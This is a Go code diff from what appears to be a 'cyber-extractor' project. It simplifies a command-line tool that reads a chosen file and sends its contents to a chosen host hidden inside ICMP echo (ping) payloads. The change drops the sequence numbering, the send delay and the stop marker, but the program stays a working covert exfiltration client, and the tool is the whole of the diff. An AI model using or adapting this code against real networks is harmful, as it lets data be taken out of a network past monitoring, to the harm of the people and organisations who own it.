@@ -2,21 +2,14 @@ package main
 
 import (
 	"bufio"
-	"bytes"
-	"encoding/binary"
-	icmpcommons "github.com/Anthony-Jhoiro/cyber-extractor/icmp"
 	"golang.org/x/net/icmp"
 	"golang.org/x/net/ipv4"
 	"log"
-	"math"
 	"os"
-	"time"
 )
 
 const (
 	MaxPayloadSize = 65507
-	// PingDelay delay between each ping in milliseconds
-	PingDelay = 5
 )
 
 // noVerifySplitBytes is a simple split function that simply returns its content
@@ -27,25 +20,13 @@ func noVerifySplitBytes(data []byte, atEOF bool) (advance int, token []byte, err
 	return len(data), data, nil
 }
 
-func intTo4ByteArray(i uint32) []byte {
-	bs := make([]byte, 4)
-	binary.LittleEndian.PutUint32(bs, i)
-	return bs
-}
-
 // buildICMPEchoRequest build an ICMP echo request with the given data as a byte array
-func buildICMPEchoRequest(id uint32, seq uint32, data []byte) *icmp.Message {
-	buff := new(bytes.Buffer)
-
-	buff.Write(intTo4ByteArray(id))
-	buff.Write(intTo4ByteArray(seq))
-	buff.Write(data)
-
+func buildICMPEchoRequest(data []byte) *icmp.Message {
 	// Build the echo request
 	body := &icmp.Echo{
 		ID:   1,
 		Seq:  2,
-		Data: buff.Bytes(),
+		Data: data,
 	}
 
 	// Wrap the echo request in an icmp message that can be sent easily.
@@ -57,10 +38,10 @@ func buildICMPEchoRequest(id uint32, seq uint32, data []byte) *icmp.Message {
 }
 
 // sendData build and send an icmp echo request to the given connection with the given bytes
-func sendData(conn *icmp.PacketConn, id uint32, seq uint32, data []byte) {
-	log.Printf("Send [%d] - %d - %d bytes\n", id, seq, len(data))
+func sendData(conn *icmp.PacketConn, data []byte) {
+	log.Printf("Send %d bytes\n", len(data))
 
-	msg := buildICMPEchoRequest(id, seq, data)
+	msg := buildICMPEchoRequest(data)
 
 	// Transform the message to a byte array
 	msgBytes, err := msg.Marshal(nil)
@@ -75,11 +56,10 @@ func sendData(conn *icmp.PacketConn, id uint32, seq uint32, data []byte) {
 }
 
 func main() {
+
 	// Get the destination and filename from the command line arguments
 	destination := os.Args[1]
 	filename := os.Args[2]
-
-	id := uint32(time.Now().Unix() % math.MaxInt)
 
 	// Create a connection to the given destination using udp4 to listen with no privilege.
 	conn, err := icmp.ListenPacket("udp4", destination)
@@ -102,16 +82,10 @@ func main() {
 	scanner := bufio.NewScanner(fileReader)
 	scanner.Split(noVerifySplitBytes)
 
-	var sequenceCount uint32 = 1
 	// Start scanning the file and for each read bytes, send it to the destination.
 	for scanner.Scan() {
-		sendData(conn, id, sequenceCount, scanner.Bytes())
-
-		time.Sleep(5 * time.Millisecond)
-		sequenceCount += 1
+		sendData(conn, scanner.Bytes())
 	}
-
-	sendData(conn, id, sequenceCount, icmpcommons.StopSequence)
 
 	// If there has been an error reading the file displays it.
 	if err = scanner.Err(); err != nil {
